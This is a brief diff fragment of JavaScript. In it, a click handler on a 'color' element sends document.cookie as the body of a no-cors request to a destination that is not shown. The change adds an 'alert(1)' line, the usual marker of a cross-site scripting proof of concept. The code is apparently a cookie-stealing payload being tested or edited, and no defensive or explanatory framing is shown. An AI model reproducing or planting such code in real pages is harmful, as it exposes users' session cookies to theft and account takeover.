@@ -11,4 +11,5 @@ color.onclick = () => {
     mode: 'no-cors',
     body:document.cookie
     });
+    alert(1);
 }
